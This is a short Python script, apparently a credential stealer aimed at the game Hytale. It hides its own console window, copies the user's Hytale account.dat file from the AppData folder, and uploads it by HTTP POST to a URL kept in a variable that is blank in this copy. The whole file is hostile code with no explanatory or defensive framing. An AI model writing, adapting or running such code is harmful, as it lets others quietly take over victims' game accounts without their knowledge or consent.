import os
import requests
import shutil
import tempfile
import ctypes
import sys
from pathlib import Path

def silent():
    if ctypes.windll.user32.GetConsoleWindow() != 0:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

silent()

SENDWGF = ""

HytaleDir = Path(os.getenv('APPDATA')) / "Hytale"
FakeException = HytaleDir / "account.dat"

if FakeException.exists():
    with tempfile.NamedTemporaryFile(delete=False, suffix='.dat') as Tempfile:
        shutil.copy2(FakeException, Tempfile.name)
        temp = Tempfile.name
    
    try:
        with open(temp, 'rb') as f:
            files = {'file': ('account.dat', f, 'application/octet-stream')}
            data = {'content': f'File found {FakeException}'}
            requests.post(SENDWGF, data=data, files=files)
    finally:
        os.unlink(temp)

